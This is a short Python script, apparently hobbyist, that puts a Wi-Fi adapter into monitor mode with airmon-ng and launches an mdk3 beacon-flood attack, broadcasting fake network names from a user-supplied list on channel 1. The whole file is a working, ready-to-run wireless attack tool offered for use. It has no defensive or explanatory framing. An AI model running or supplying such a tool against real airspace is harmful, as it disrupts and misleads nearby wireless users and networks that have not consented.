import subprocess
import re
import os
import time
import shutil

print("\033[93m-------We ArE ReApEr------")

if not 'SUDO_UID' in os.environ.keys():
	print("RUN WITH SUDO")
	exit()

wlan_pattern = re.compile("^wlo[0-9]+")
check_wifi = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())


if len(check_wifi) == 0:
	print("No WiFi adapter")
	exit()

print("Available WiFi interfaces:")
for index, item in enumerate(check_wifi):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Select the interface you want to use for attack: ")
    try:
        if check_wifi[int(wifi_interface_choice)]:
            break
    except:
        print("Enter a valid number")


hackface = check_wifi[int(wifi_interface_choice)]

print("Killing conflict processes")

subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Going Monitor Mode")

subprocess.run(["sudo", "airmon-ng", "start", hackface])

lst_path = input("Insert WiFi list path: ")
	
print("Press Ctrl+C at any time to stop the attack")

try:
	subprocess.run(["mdk3", hackface, "b", "-c", "1", "-f", lst_path])

except KeyboardInterrupt:
	print("Stopping attack")

subprocess.run(["sudo", "airmon-ng", "stop", hackface])
